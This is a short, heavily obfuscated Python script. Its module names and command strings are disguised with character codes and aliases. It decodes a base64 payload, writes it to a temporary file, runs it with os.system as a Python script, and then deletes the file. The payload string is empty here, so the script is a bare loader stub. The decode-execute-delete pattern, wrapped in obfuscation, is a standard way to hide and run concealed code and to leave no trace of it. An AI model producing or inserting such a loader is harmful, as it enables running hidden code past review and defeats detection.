S,H,R,I,D,A,H2,R2 = map(chr, [83, 72, 82, 73, 68, 65, 72, 82])
SH, HR, RI, ID = S+H, H+R, R+I, I+D
SHRIDHAR = S+H+R+I+D+A+H2+R2
import tempfile as SHRIDHAR_TEMP
from os import path as SHRIDHAR_PATH, remove as SHRIDHAR_REMOVE, system as SHRIDHAR_SYSTEM
from base64 import b64decode as SHRIDHAR_DECODE
SHRIDHAR_ENC = ("")
try:
	with SHRIDHAR_TEMP.NamedTemporaryFile(delete=False, suffix='.'+H2+R2.lower()) as SHRIDHAR_FILE:
		SHRIDHAR_FILE.write(SHRIDHAR_DECODE(SHRIDHAR_ENC))
		SHRIDHAR_FILEPATH = SHRIDHAR_FILE.name
	SHRIDHAR_SYSTEM(''.join([chr(112), chr(121), chr(116), chr(104), chr(111), chr(110), chr(32)]) + '"' + SHRIDHAR_FILEPATH + '"')
except Exception as SHRIDHAR_ERR:
	getattr(__import__('builtins'), ''.join(map(chr, [112,114,105,110,116])))(SHRIDHAR_ERR)
finally:
	if 'SHRIDHAR_FILEPATH' in locals() and SHRIDHAR_PATH.exists(SHRIDHAR_FILEPATH):
		SHRIDHAR_REMOVE(SHRIDHAR_FILEPATH)
